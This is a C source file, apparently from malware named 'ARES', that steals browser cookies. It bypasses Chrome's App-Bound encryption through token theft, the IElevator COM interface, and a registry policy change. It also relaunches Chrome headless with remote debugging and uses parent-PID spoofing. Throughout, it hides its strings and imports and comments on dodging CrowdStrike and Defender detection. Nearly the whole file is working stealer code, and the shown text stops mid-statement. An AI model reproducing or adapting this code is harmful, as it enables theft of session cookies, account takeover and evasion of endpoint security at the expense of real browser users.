/*
 * ARES — Chrome v20+ App-Bound Bypass via CDP WebSocket
 *
 * PROVEN WORKING on Chrome 148 with App-Bound encryption
 *
 * Strategy: Kill Chrome → launch headless (default profile)
 *   → Browser-level WebSocket CDP
 *   → Target.createTarget → attachToTarget(flatten)
 *   → Page.navigate → Network.getAllCookies(session)
 *   → Decrypted cookies → Kill Chrome
 *
 * Stealth:
 *   - Parent PID spoofing (launches under explorer.exe)
 *   - CREATE_NO_WINDOW + SW_HIDE
 *   - Random debug port (10000-60000)
 *   - < 8 second total runtime
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include "ares_strings.h"
#include <stdio.h>
#include <string.h>
/* #include <shlobj.h> — removed v3.0: CSIDL_ resolved via ares_resolve.h env emulation */
/* wincrypt.h / bcrypt.h — removed: types provided by ares_resolve.h manual defs (no IAT) */
#include <objbase.h>
#include <winhttp.h>
#include "proc_enum.h" /* replaces tlhelp32 */

/* ── IElevator COM (Layer 1-2) ── */
/* v3.7: Multi-channel CLSIDs — try Stable, Beta, Dev, Canary */
static const GUID CLSID_ChromeElevators[] = {
    /* Chrome Stable */
    { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } },
    /* Chrome Beta */
    { 0xDD2646BA, 0x3707, 0x4BF8, { 0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2 } },
    /* Chrome Dev */
    { 0xDA7FDCA5, 0x2CAA, 0x4637, { 0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA } },
    /* Chrome Canary */
    { 0x704C2872, 0x2049, 0x435E, { 0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B } },
};
#define NUM_CHROME_ELEVATORS (sizeof(CLSID_ChromeElevators)/sizeof(CLSID_ChromeElevators[0]))
static const GUID IID_IElevator = {
    0x1BF5208B, 0x295F, 0x4992,
    { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 }
};
typedef struct IElevator IElevator;
typedef struct IElevatorVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IElevator*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IElevator*);
    ULONG   (STDMETHODCALLTYPE *Release)(IElevator*);
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(
        IElevator*, const wchar_t*, const wchar_t*,
        const wchar_t*, const wchar_t*, DWORD, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(
        IElevator*, int, const BYTE*, DWORD, BYTE**, DWORD*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(
        IElevator*, const BYTE*, DWORD, BYTE**, DWORD*);
} IElevatorVtbl;
struct IElevator { const IElevatorVtbl* lpVtbl; };

static HANDLE steal_chrome_token(void) {
    /* v2.2: Use proc_enum.h instead of CreateToolhelp32Snapshot */
    DWORD chrome_pids[32];
    int n = proc_find_all("chrome.exe", chrome_pids, 32);
    HANDLE token = NULL;
    for (int i = 0; i < n && !token; i++) {
        HANDLE hProc = _nt_open_process(chrome_pids[i], PROCESS_QUERY_INFORMATION);
        if (hProc) {
            HANDLE pt;
            if (OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY, &pt)) {
                DuplicateToken(pt, SecurityImpersonation, &token);
                CloseHandle(pt);
            }
            CloseHandle(hProc);
        }
    }
    return token;
}

static int decrypt_v20_via_com(const BYTE* enc, int len, BYTE* dec, int max) {
    _resolve_ole32(); _resolve_crypt32();
    if (!p_CoInitializeEx || !p_CoCreateInstance) return -1;
    HRESULT hr = p_CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return -1;

    /* v3.7: Auto-start Chrome Elevation Service if not running.
     * Service name: "GoogleChromeElevationService" (Stable)
     * Without this service, IElevator COM instantiation fails. */
    {
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            const char* svcNames[] = {
                "GoogleChromeElevationService",
                "GoogleChromeBetaElevationService",
                "GoogleChromeDevElevationService",
                "GoogleChromeCanaryElevationService",
                NULL
            };
            for (int si = 0; svcNames[si]; si++) {
                SC_HANDLE svc = OpenServiceA(scm, svcNames[si],
                    SERVICE_START | SERVICE_QUERY_STATUS);
                if (svc) {
                    SERVICE_STATUS ss;
                    if (QueryServiceStatus(svc, &ss) &&
                        ss.dwCurrentState != SERVICE_RUNNING) {
                        StartServiceA(svc, 0, NULL);
                        Sleep(1000); /* wait for service start */
                    }
                    CloseServiceHandle(svc);
                }
            }
            CloseServiceHandle(scm);
        }
    }

    /* Try with Chrome's token for App-Bound context */
    HANDLE ct = steal_chrome_token();
    if (ct) { ImpersonateLoggedOnUser(ct); }

    /* v3.7: Try ALL Chrome channel CLSIDs (Stable, Beta, Dev, Canary) */
    int r = -1;
    for (int ci = 0; ci < (int)NUM_CHROME_ELEVATORS && r < 0; ci++) {
        IElevator* e = NULL;
        hr = p_CoCreateInstance(&CLSID_ChromeElevators[ci], NULL,
            CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&e);
        if (FAILED(hr) || !e) continue;

        BYTE* pt = NULL; DWORD ptl = 0;
        hr = e->lpVtbl->DecryptData(e, enc, len, &pt, &ptl);
        if (SUCCEEDED(hr) && pt && ptl > 0) {
            r = (int)ptl > max ? max : (int)ptl;
            memcpy(dec, pt, r);
            if (p_CoTaskMemFree) p_CoTaskMemFree(pt);
        }
        e->lpVtbl->Release(e);
    }

    if (ct) { RevertToSelf(); CloseHandle(ct); }
    if (p_CoUninitialize) p_CoUninitialize();
    return r;
}

static int decrypt_v20_via_impersonation(const BYTE* enc, int len, BYTE* dec, int max) {
    _resolve_crypt32();
    HANDLE t = steal_chrome_token();
    if (!t) return -1;
    if (!ImpersonateLoggedOnUser(t)) { CloseHandle(t); return -1; }
    /* Try full blob first (master key blob has no v10 prefix) */
    DATA_BLOB in = { (DWORD)len, (BYTE*)enc }, out = {0};
    int r = -1;
    if (p_CryptUnprotectData(&in, NULL,NULL,NULL,NULL, CRYPTPROTECT_UI_FORBIDDEN, &out)) {
        r = (int)out.cbData > max ? max : (int)out.cbData;
        memcpy(dec, out.pbData, r); LocalFree(out.pbData);
    }
    /* If failed and blob > 3 bytes, try stripping v10/v20 prefix */
    if (r < 0 && len > 3) {
        DATA_BLOB in2 = { (DWORD)(len-3), (BYTE*)(enc+3) };
        out = (DATA_BLOB){0};
        if (p_CryptUnprotectData(&in2, NULL,NULL,NULL,NULL, CRYPTPROTECT_UI_FORBIDDEN, &out)) {
            r = (int)out.cbData > max ? max : (int)out.cbData;
            memcpy(dec, out.pbData, r); LocalFree(out.pbData);
        }
    }
    RevertToSelf(); CloseHandle(t); return r;
}

/* Strategy 0: Disable ABE via Chrome enterprise policy (DISABLED — FIX-09)
 * v3.7: REMOVED from production builds. Modifying Chrome's
 * ApplicationBoundEncryptionEnabled registry key is a high-confidence
 * CrowdStrike/MDE detection rule. Use IElevator COM injection or
 * ChromeKatz memory scan instead. */
#ifdef ARES_INCLUDE_ABE_POLICY
BOOL disable_abe_policy(void) {
    HKEY hk;
    /* Try HKLM first (requires admin) */
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Policies\\Google\\Chrome", 0, NULL, 0,
        KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExA(hk, "ApplicationBoundEncryptionEnabled", 0, REG_DWORD, 
            (BYTE*)&val, sizeof(val));
        RegCloseKey(hk);
        return TRUE;
    }
    /* Fallback: HKCU (no admin needed, works for user-level Chrome) */
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "SOFTWARE\\Policies\\Google\\Chrome", 0, NULL, 0,
        KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        DWORD val = 0;
        RegSetValueExA(hk, "ApplicationBoundEncryptionEnabled", 0, REG_DWORD, 
            (BYTE*)&val, sizeof(val));
        RegCloseKey(hk);
        return TRUE;
    }
    return FALSE;
}

void restore_abe_policy(void) {
    HKEY hk;
    /* Clean HKLM */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Google\\Chrome",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, "ApplicationBoundEncryptionEnabled");
        RegCloseKey(hk);
    }
    /* Clean HKCU */
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Google\\Chrome",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, "ApplicationBoundEncryptionEnabled");
        RegCloseKey(hk);
    }
}
#endif /* ARES_INCLUDE_ABE_POLICY */

int Ares_DecryptV20(const BYTE* enc, int len, BYTE* dec, int max) {
    /* Strategy 1: IElevator COM with Chrome token */
    int r = decrypt_v20_via_com(enc, len, dec, max);
    if (r > 0) return r;
    /* Strategy 2: Token impersonation */
    r = decrypt_v20_via_impersonation(enc, len, dec, max);
    if (r > 0) return r;

    /* Strategy 3: Disable ABE via Chrome enterprise policy (DISABLED — FIX-09)
     * v3.7: Same as stealer.c Try 4 — compiled out in production. */
#ifdef ARES_INCLUDE_ABE_POLICY
    if (disable_abe_policy()) {
        /* Kill all Chrome instances via proc_enum (no Toolhelp) */
        DWORD cpids[32]; int cn = proc_find_all("chrome.exe", cpids, 32);
        for (int _i = 0; _i < cn; _i++) {
            HANDLE hp = _nt_open_process(cpids[_i], PROCESS_TERMINATE);
            if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
        }

        /* Wait for Chrome to fully exit + policy to take effect */
        Sleep(2000);

        /* Retry with standard DPAPI (ABE now disabled) */
        _resolve_crypt32();
        if (p_CryptUnprotectData) {
            DATA_BLOB in = { (DWORD)len, (BYTE*)enc }, out = {0};
            if (p_CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 
                CRYPTPROTECT_UI_FORBIDDEN, &out)) {
                r = (int)out.cbData > max ? max : (int)out.cbData;
                memcpy(dec, out.pbData, r);
                LocalFree(out.pbData);
            }
            /* Also try with v20 prefix stripped */
            if (r < 0 && len > 3) {
                DATA_BLOB in2 = { (DWORD)(len-3), (BYTE*)(enc+3) };
                out = (DATA_BLOB){0};
                if (p_CryptUnprotectData(&in2, NULL, NULL, NULL, NULL,
                    CRYPTPROTECT_UI_FORBIDDEN, &out)) {
                    r = (int)out.cbData > max ? max : (int)out.cbData;
                    memcpy(dec, out.pbData, r);
                    LocalFree(out.pbData);
                }
            }
        }

        /* Always restore ABE policy — don't leave fingerprint */
        restore_abe_policy();
    }
#endif /* ARES_INCLUDE_ABE_POLICY */
    return r;
}

/* Find PID of explorer.exe for parent PID spoofing */
static DWORD find_explorer_pid(void) {
    return proc_find_pid("explorer.exe");
}

/* ── Browser Detection ── */
typedef struct { const char* name; const char* subpath; const wchar_t* wexe; } BrowserDef;

/* v3.0: Runtime-init from encrypted strings */
static BrowserDef g_browsers[4];
static BOOL g_browsers_init = FALSE;
static char _bp_chrome[64], _bp_edge[64], _bp_brave[64];
static char _bn_chrome[16], _bn_edge[16], _bn_brave[16];
static void _init_browsers(void) {
    if (g_browsers_init) return;
    DEC_CHROME_EXE_PATH(_bp_chrome); DEC_EDGE_EXE_PATH(_bp_edge); DEC_BRAVE_EXE_PATH(_bp_brave);
    DEC_LABEL_CHROME(_bn_chrome); DEC_LABEL_EDGE(_bn_edge); DEC_LABEL_BRAVE(_bn_brave);
    g_browsers[0] = (BrowserDef){_bn_chrome, _bp_chrome, L"chrome.exe"};
    g_browsers[1] = (BrowserDef){_bn_edge, _bp_edge, L"msedge.exe"};
    g_browsers[2] = (BrowserDef){_bn_brave, _bp_brave, L"brave.exe"};
    g_browsers[3] = (BrowserDef){NULL, NULL, NULL};
    g_browsers_init = TRUE;
}

static BOOL find_browser_path(const BrowserDef* b, char* out, int max) {
    char la[MAX_PATH], pf[MAX_PATH], pf86[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, pf);
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, pf86);
    const char* bases[] = { pf, la, pf86, NULL };
    for (int i = 0; bases[i]; i++) {
        snprintf(out, max, "%s\\%s", bases[i], b->subpath);
        if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return TRUE;
    }
    return FALSE;
}

static BOOL find_chrome_path(char* out, int max) {
    _init_browsers();
    return find_browser_path(&g_browsers[0], out, max);
}

/* ── Dynamic Domain Extraction from Cookie DB ── */
/* Read cookie DB binary and extract unique host_key domains */
static int extract_domains_from_cookiedb(char domains[][256], int maxDomains) {
    char la[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    /* Try Chrome, Edge, Brave cookie DBs */
    char _cdb1[64], _cdb2[64], _cdb3[80];
    DEC_CHROME_COOKIE_DB(_cdb1); DEC_EDGE_COOKIE_DB(_cdb2); DEC_BRAVE_COOKIE_DB(_cdb3);
    const char* dbPaths[] = { _cdb1, _cdb2, _cdb3, NULL };
    int count = 0;
    for (int db = 0; dbPaths[db] && count < maxDomains; db++) {
        char path[MAX_PATH+128];
        snprintf(path, sizeof(path), "%s\\%s", la, dbPaths[db]);
        HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;
        DWORD sz = GetFileSize(hFile, NULL);
        if (sz == 0 || sz > 10*1024*1024) { CloseHandle(hFile); continue; }
        char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz);
        DWORD rd; ReadFile(hFile, buf, sz, &rd, NULL); CloseHandle(hFile);
        /* Scan for domain patterns: .xxx.com, .xxx.org, .xxx.net etc */
        for (DWORD i = 0; i < rd - 8 && count < maxDomains; i++) {
            if (buf[i] == '.' && buf[i+1] >= 'a' && buf[i+1] <= 'z') {
                /* Find end of domain (printable ASCII, dots, hyphens) */
                int j = (int)i, len = 0;
                while (j < (int)rd && len < 255 &&
                    ((buf[j]>='a'&&buf[j]<='z') || (buf[j]>='0'&&buf[j]<='9') ||
                     buf[j]=='.' || buf[j]=='-')) { j++; len++; }
                if (len >= 5 && len < 200) {
                    char* cand = buf + i;
                    char tmp[256]; memcpy(tmp, cand, len); tmp[len] = 0;
                    /* Validate: must end with known TLD */
                    const char* tlds[] = {".com",".org",".net",".io",".ai",".co",
                        ".dev",".me",".vn",".uk",".de",".fr",".jp",".ru",".br",
                        ".in",".au",".ca",".nl",".se",".no",".fi",".be",".at",
                        ".tv",".gg",".app",".xyz",".top",".info",".biz",NULL};
                    int validTld = 0;
                    for (int t = 0; tlds[t]; t++) {
                        int tl = (int)strlen(tlds[t]);
                        if (len > tl && strcmp(tmp + len - tl, tlds[t]) == 0) {
                            validTld = 1; break;
                        }
                    }
                    if (validTld) {
                        int dup = 0;
                        for (int k = 0; k < count; k++) {
                            if (strcmp(domains[k], tmp) == 0) { dup = 1; break; }
                        }
                        if (!dup) { memcpy(domains[count], tmp, len+1); count++; }
                    }
                }
                i = j; /* Skip past this domain */
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
    }
    return count;
}

/* ── WebSocket CDP Client ── */
static HINTERNET cdp_ws_connect(int port, const char* wsPath) {
    _resolve_winhttp(); /* ensure this TU's pointers are resolved */
    HINTERNET hSession = p_WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return NULL;
    HINTERNET hConnect = p_WinHttpConnect(hSession, L"127.0.0.1",
        (INTERNET_PORT)port, 0);
    if (!hConnect) { p_WinHttpCloseHandle(hSession); return NULL; }
    wchar_t wpath[1024];
    MultiByteToWideChar(CP_UTF8, 0, wsPath, -1, wpath, 1024);
    HINTERNET hRequest = p_WinHttpOpenRequest(hConnect, L"GET", wpath, NULL, NULL, NULL, 0);
    if (!hRequest) { p_WinHttpCloseHandle(hConnect); p_WinHttpCloseHandle(hSession); return NULL; }
    if (!p_WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0) ||
        !p_WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) ||
        !p_WinHttpReceiveResponse(hRequest, NULL)) {
        p_WinHttpCloseHandle(hRequest); p_WinHttpCloseHandle(hConnect); p_WinHttpCloseHandle(hSession);
        return NULL;
    }
    HINTERNET hWs = p_WinHttpWebSocketCompleteUpgrade(hRequest, 0);
    p_WinHttpCloseHandle(hRequest);
    if (!hWs) { p_WinHttpCloseHandle(hConnect); p_WinHttpCloseHandle(hSession); }
    return hWs;
}

static int cdp_http_get(int port, const char* path, char* resp, int max) {
    _resolve_winhttp();
    HINTERNET hSess = p_WinHttpOpen(L"M", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSess) return -1;
    DWORD t = 3000;
    p_WinHttpSetOption(hSess, WINHTTP_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
    p_WinHttpSetOption(hSess, WINHTTP_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
    HINTERNET hConn = p_WinHttpConnect(hSess, L"127.0.0.1", (INTERNET_PORT)port, 0);
    if (!hConn) { p_WinHttpCloseHandle(hSess); return -1; }
    wchar_t wp[1024]; MultiByteToWideChar(CP_UTF8, 0, path, -1, wp, 1024);
    HINTERNET hReq = p_WinHttpOpenRequest(hConn, L"GET", wp, NULL, NULL, NULL, 0);
    if (!hReq) { p_WinHttpCloseHandle(hConn); p_WinHttpCloseHandle(hSess); return -1; }
    if (!p_WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) ||
        !p_WinHttpReceiveResponse(hReq, NULL)) {
        p_WinHttpCloseHandle(hReq); p_WinHttpCloseHandle(hConn); p_WinHttpCloseHandle(hSess); return -1;
    }
    DWORD total = 0, br;
    while (p_WinHttpReadData(hReq, resp+total, max-total-1, &br) && br > 0) total += br;
    resp[total] = '\0';
    p_WinHttpCloseHandle(hReq); p_WinHttpCloseHandle(hConn); p_WinHttpCloseHandle(hSess);
    return (int)total;
}

/* ── Enhanced Cookie Parser (extracts all fields) ── */
static int parse_cdp_cookies_ex(const char* json, STOLEN_COOKIE* cookies,
    int maxCk, const char* browserName)
{
    int count = 0;
    const char* p = strstr(json, "\"cookies\":[");
    if (!p) return 0;
    p = strchr(p, '['); if (!p) return 0; p++;

    while (count < maxCk) {
        const char* obj = strchr(p, '{');
        if (!obj) break;
        const char* oe = obj; int depth = 1;
        for (oe++; *oe && depth > 0; oe++) {
            if (*oe == '{') depth++; else if (*oe == '}') depth--;
        }
        if (depth != 0) break;

        STOLEN_COOKIE* ck = &cookies[count];
        memset(ck, 0, sizeof(*ck));

        #define X(fld, key, sz) do { \
            const char* _k = strstr(obj, "\"" key "\":\""); \
            if (_k && _k < oe) { _k += strlen("\"" key "\":\""); \
                const char* _e = _k; \
                while (*_e && *_e != '"') { if (*_e == '\\' && _e[1]) _e++; _e++; } \
                int _l = (int)(_e - _k); if (_l >= sz) _l = sz-1; \
                memcpy(fld, _k, _l); fld[_l] = 0; \
            } } while(0)

        X(ck->host, "domain", sizeof(ck->host));
        X(ck->name, "name", sizeof(ck->name));
        X(ck->value, "value", sizeof(ck->value));
        X(ck->path, "path", sizeof(ck->path));
        X(ck->sameSite, "sameSite", sizeof(ck->sameSite));
        #undef X

        ck->secure = (strstr(obj, "\"secure\":true") && strstr(obj, "\"secure\":true") < oe);
        ck->httponly = (strstr(obj, "\"httpOnly\":true") && strstr(obj, "\"httpOnly\":true") < oe);
        ck->session = (strstr(obj, "\"session\":true") && strstr(obj, "\"session\":true") < oe);

        /* Parse expires as double → INT64 */
        const char* exp = strstr(obj, "\"expires\":");
        if (exp && exp < oe) {
            exp += 10;
            ck->expires = (INT64)strtod(exp, NULL);
        }

        if (browserName) snprintf(ck->browser, sizeof(ck->browser), "%s", browserName);
        if (ck->host[0] || ck->name[0]) count++;
        p = oe;
    }
    return count;
}

/* Legacy wrapper */
static int parse_cdp_cookies(const char* json, STOLEN_COOKIE* cookies, int maxCk) {
    return parse_cdp_cookies_ex(json, cookies, maxCk, "Chrome");
}

/* ═══════════════════════════════════════════════════════════════
 *  PUBLIC API: CDP Cookie Steal  (v2 — proven working)
 *
 *  1. Kill Chrome + remove profile locks
 *  2. Launch Chrome headless (NO --user-data-dir = default profile)
 *     with PPID spoofing under explorer.exe
 *  3. GET /json/version → extract BROWSER-level wsDebuggerUrl
 *  4. WS connect → Target.createTarget → Target.attachToTarget
 *  5. Page.navigate (triggers cookie store load)
 *  6. Network.getAllCookies via session → parse → STOLEN_COOKIE[]
 *  7. Kill Chrome

/* Kill all Chrome processes and remove profile lock files */
static void kill_chrome_and_unlock(void) {
    /* v2.2: proc_enum replaces Toolhelp */
    DWORD cpids[32]; int cn = proc_find_all("chrome.exe", cpids, 32);
    for (int _i = 0; _i < cn; _i++) {
        HANDLE h = _nt_open_process(cpids[_i], PROCESS_TERMINATE);
        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
    }
    Sleep(1500);

    /* Remove lock files from default profile */
    char la[MAX_PATH], lf[MAX_PATH+128];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    char profileDir[MAX_PATH+64];
    { char _cud[32]; DEC_CHROME_USERDATA(_cud);
    snprintf(profileDir, sizeof(profileDir), "%s\\%s", la, _cud); }
    snprintf(lf, sizeof(lf), "%s\\SingletonLock", profileDir); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonSocket", profileDir); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonCookie", profileDir); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\lockfile", profileDir); DeleteFileA(lf);
}

/* Send CDP command on WebSocket, skip events, return response matching id */
static int cdp_send_and_wait(HINTERNET hWs, const char* cmd, int expectId,
    char* resp, int respMax)
{
    p_WinHttpWebSocketSend(hWs, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
        (PVOID)cmd, (DWORD)strlen(cmd));

    char idStr[32];
    snprintf(idStr, sizeof(idStr), "\"id\":%d", expectId);

    /* Read directly into resp buffer (no stack limit) */
    for (int i = 0; i < 30; i++) {
        DWORD bytesRead; WINHTTP_WEB_SOCKET_BUFFER_TYPE bt;
        DWORD tr = 0;
        while (tr < (DWORD)(respMax - 1)) {
            if (p_WinHttpWebSocketReceive(hWs, resp+tr, respMax-tr-1, &bytesRead, (DWORD*)&bt) != 0) break;
            tr += bytesRead;
            if (bt == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) break;
        }
        resp[tr] = '\0';
        if (strstr(resp, idStr)) return (int)tr;
        /* Event — read next message (overwrite resp) */
    }
    resp[0] = '\0';
    return 0;
}

int Ares_CDP_StealCookies(STOLEN_COOKIE* cookies, int max_cookies)
{
    int count = 0;
    char chromePath[MAX_PATH+64];
    if (!find_chrome_path(chromePath, sizeof(chromePath))) return 0;

    /* Step 1: Kill Chrome + unlock profile */
    kill_chrome_and_unlock();

    /* Step 2: Launch headless Chrome — NO --user-data-dir (uses default profile) */
    int debugPort = 10000 + (GetTickCount() % 50000);
    char cmdLine[2048];
    /* v3.0: CDP flags built from encrypted fragments */
    char _hf[48], _nf[32];
    DEC_CDP_HEADLESS_FLAGS(_hf); /* "--headless=new --remote-debugging-port=" */
    DEC_CDP_NO_FIRST(_nf);      /* "--no-first-run --disable-gpu" */
    snprintf(cmdLine, sizeof(cmdLine),
        "\"%s\" %s%d %s",
        chromePath, _hf, debugPort, _nf);

    HANDLE hChrome = NULL;
    {
        /* Try PPID spoofing under explorer.exe */
        DWORD explorerPid = find_explorer_pid();
        STARTUPINFOEXA siex = {0};
        siex.StartupInfo.cb = sizeof(siex);
        siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        siex.StartupInfo.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        BOOL ok = FALSE;

        if (explorerPid > 0) {
            HANDLE hExp = _nt_open_process(explorerPid, PROCESS_CREATE_PROCESS);
            if (hExp) {
                SIZE_T attrSize = 0;
                InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
                siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
                    GetProcessHeap(), 0, attrSize);
                if (siex.lpAttributeList &&
                    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize) &&
                    UpdateProcThreadAttribute(siex.lpAttributeList, 0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExp, sizeof(HANDLE), NULL, NULL)) {
                    ok = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                        NULL, NULL, &siex.StartupInfo, &pi);
                }
                if (siex.lpAttributeList) {
                    DeleteProcThreadAttributeList(siex.lpAttributeList);
                    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
                }
                CloseHandle(hExp);
            }
        }
        if (!ok) {
            STARTUPINFOA si = { sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            ok = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        }
        if (!ok) return 0;
        CloseHandle(pi.hThread);
        hChrome = pi.hProcess;
    }

    /* Step 3: Wait for debug port (poll /json/version) */
    char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4*1024*1024);
    int rlen = -1;
    for (int retry = 0; retry < 15 && rlen <= 0; retry++) {
        Sleep(1000);
        rlen = cdp_http_get(debugPort, "/json/version", resp, 4*1024*1024);
    }
    if (rlen <= 0) goto cleanup;

    /* Step 4: Extract BROWSER-level WebSocket URL from /json/version */
    char wsPath[512] = {0};
    {
        char _wskey[24]; DEC_CDP_WS_KEY(_wskey);
        char _wsk2[32]; snprintf(_wsk2, sizeof(_wsk2), "\"%s\"", _wskey);
        char* ws = strstr(resp, _wsk2);
        if (ws) {
            char* u = strstr(ws, "ws://");
            if (u) {
                u += 5;
                while (*u && *u != '/') u++;
                char* end = u;
                while (*end && *end != '"' && *end != '\r' && *end != '\n') end++;
                int l = (int)(end-u);
                if (l > 0 && l < 511) { memcpy(wsPath, u, l); wsPath[l] = 0; }
            }
        }
    }
    if (!wsPath[0]) goto cleanup;

    /* Step 5: Connect WebSocket → create target → attach → navigate → extract */
    {
        HINTERNET hWs = cdp_ws_connect(debugPort, wsPath);
        if (!hWs) goto cleanup;

        char cmd[512];

        /* 5a: Create target page */
        snprintf(cmd, sizeof(cmd),
            "{\"id\":1,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"about:blank\"}}");
        cdp_send_and_wait(hWs, cmd, 1, resp, 4*1024*1024);

        char targetId[128] = {0};
        { char* t = strstr(resp, "\"targetId\":\"");
          if (t) { t+=12; char*e=strchr(t,'"'); if(e) { int l=(int)(e-t); if(l<127) memcpy(targetId,t,l); } } }
        if (!targetId[0]) { p_WinHttpWebSocketClose(hWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
            p_WinHttpCloseHandle(hWs); goto cleanup; }

        /* 5b: Attach to target with flatten=true */
        snprintf(cmd, sizeof(cmd),
            "{\"id\":2,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"%s\",\"flatten\":true}}",
            targetId);
        cdp_send_and_wait(hWs, cmd, 2, resp, 4*1024*1024);

        char sessionId[128] = {0};
        { char* s = strstr(resp, "\"sessionId\":\"");
          if (s) { s+=13; char*e=strchr(s,'"'); if(e) { int l=(int)(e-s); if(l<127) memcpy(sessionId,s,l); } } }

        /* 5c: Dynamic domain navigation — extract domains from cookie DB
         * then navigate to each to force Chrome to decrypt cookies */
        char (*dynDomains)[256] = (char(*)[256])HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY, 200 * 256);
        int nDomains = 0;
        if (dynDomains) {
            nDomains = extract_domains_from_cookiedb(dynDomains, 200);
        }

        /* Fallback static list if DB scan found nothing */
        const char* fallback[] = {
            "https://www.google.com", "https://www.youtube.com",
            "https://www.facebook.com", "https://www.bing.com",
            "https://accounts.google.com", NULL
        };

        int navId = 10;
        if (nDomains > 0) {
            /* Navigate to dynamic domains (max 50 to limit time) */
            int maxNav = nDomains > 50 ? 50 : nDomains;
            for (int d = 0; d < maxNav; d++) {
                char url[512];
                snprintf(url, sizeof(url), "https://%s",
                    dynDomains[d][0] == '.' ? dynDomains[d]+1 : dynDomains[d]);
                snprintf(cmd, sizeof(cmd),
                    "{\"id\":%d,\"method\":\"Page.navigate\",\"params\":{\"url\":\"%s\"},\"sessionId\":\"%s\"}",
                    navId, url, sessionId);
                cdp_send_and_wait(hWs, cmd, navId, resp, 4*1024*1024);
                navId++; Sleep(300);
            }
        } else {
            for (int d = 0; fallback[d]; d++) {
                snprintf(cmd, sizeof(cmd),
                    "{\"id\":%d,\"method\":\"Page.navigate\",\"params\":{\"url\":\"%s\"},\"sessionId\":\"%s\"}",
